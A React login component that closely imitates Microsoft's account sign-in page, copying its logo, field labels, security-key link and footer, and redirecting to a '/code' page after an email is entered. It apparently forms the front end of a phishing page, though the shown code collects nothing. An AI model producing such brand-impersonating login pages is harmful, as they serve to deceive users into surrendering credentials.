import logo from './img/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg';
import questionMark from './img/documentation_dae218aac2d25462ae286ceba8d80ce2.svg'
import key from "./img/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg";
// import { Link } from "react-router-dom";
import React, { useState } from 'react';
import './App.css';

function Login() {
  const [email, setEmail] = useState('');
  const [error, setError] = useState('');

  const handleChange = (event) => {
    setEmail(event.target.value);
  };
  const handleSubmit = () => {
    // Redirect to the next page
    window.location.href = '/code';
  }
  const handleBlur = () => {
    if (!email.includes('@gmail.com') && !email.includes('@yahoo.com')) {
      setError('Enter a valid email address, phone number, or Skype name.');
    } else {
      setError('');
    }
  };
  return (
    <>
    <div className="container">
    <div className="container2">
      <img className="logo" src={logo} alt="logo" />
      <h2 style={{fontSize:'24px', fontWeight:'600',height:'28px', width:'352px', textDecoration: 'none solid rgb(27,27, 27)'}}>
        Sign in
      </h2>
      {error && <p style={{ color: 'red' }}>{error}</p>}
      <input 
      value={email}
      onChange={handleChange}
      onBlur={handleBlur}
       required
       name="email"
       type="email"
       id="myInput" placeholder="Email, phone, or Skype"/>
      <p style={{marginBottom: '0px', fontSize:'15px'}}>
        No account?
        <a href="" id="link" style={{color: '#0067b8'}}>
            Create one!
        </a>
      </p>
      <br/>
      <p style={{marginTop: '0px', fontSize:'15px'}}>
        <a href="/code" id="link" style={{color: '#0067b8'}}>
          Sign in with a security key. 
          <img  style={{position:'relative', top:'5px'}} src={questionMark} alt="" srcset=""/>
        </a> 
      </p>
      <div>
        
          <button onClick={handleSubmit} type="button" id="next">Next</button>
      
      </div>
</div>
  <div className="sign-in-options">
    <img className="key" src={key} alt="" srcset=""/>
    <div className="sign-text">
    Sign-in options
    </div> 
    
  </div>
    </div>
  
  <div className="footer">
    <div className="footer-links">
      <a className="footer-text" href="#">Terms of use</a>
      <a className="footer-text" href="#">Privacy & cookies</a>
      <a className="footer-text" href="">. . .</a>
    </div>
  </div>
  </>
  );
  
}

export default Login;
